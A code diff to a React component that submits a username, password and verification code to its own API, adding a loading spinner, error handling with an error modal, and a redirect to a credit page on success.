@@ -6,6 +6,8 @@ function SendCodigo() {
   const [codigo, setCodigo] = useState("");
   const [valido, setValido] = useState(false);
   const [mostrarModal, setMostrarModal] = useState(false);
+  const [Cargar, setCargar] = useState(false);
+  const [error, setError] = useState("");
 
   const handleCodigo = (value: string) => {
     setCodigo(value);
@@ -29,23 +31,36 @@ function SendCodigo() {
       return;
     }
 
-    // Aquí va la lógica del envío
-    const response = await fetch("/api/addCodigoByID", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ usuario, password, codigo }),
-    });
+    setCargar(true);
 
-    const data = await response.json();
-    if (response.ok) {
-      alert("Registro exitoso!");
-      setMostrarModal(false);
-    } else {
-      console.log("Error", data.error);
-      setMostrarModal(false);
+    try {
+      const response = await fetch("/api/addCodigoByID", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ usuario, password, codigo }),
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        // Redirigir a la página /credito si la respuesta es satisfactoria
+        window.location.href = "/credito";
+      } else {
+        throw new Error(data.error || "Error desconocido");
+      }
+    } catch (error: any) {
+      // Mostrar mensaje de error en una modal
+      setError("Ha ocurrido un error, intente de nuevo más tarde.");
+      setMostrarModal(true);
+    } finally {
+      setCargar(false);
     }
+  };
+
+  const cerrarModal = () => {
+    setMostrarModal(false);
   };
 
   return (
@@ -65,10 +80,27 @@ function SendCodigo() {
         Entrar
       </button>
 
-      {/* Modal */}
-      {mostrarModal && (
+      {/* Modal de Carga */}
+      {Cargar && (
         <div className="fixed inset-0 bg-white/50 flex justify-center items-center">
           <Spinner />
+        </div>
+      )}
+
+      {/* Modal de Error */}
+      {mostrarModal && (
+        <div className="fixed inset-0 bg-black/30 flex justify-center items-center">
+          <div className="bg-white w-3/4 md:w-1/3 mx-auto p-6 rounded-sm shadow-black/30 shadow-xl grid grid-cols-1">
+            <p className="text-base text-center font-extrabold mb-4 text-[#bb1b47]">
+              {error}
+            </p>
+            <button
+              onClick={cerrarModal}
+              className="text-sm bg-[#0067b1] text-white/90 py-2 px-4 rounded mx-auto"
+            >
+              Cerrar
+            </button>
+          </div>
         </div>
       )}
     </div>
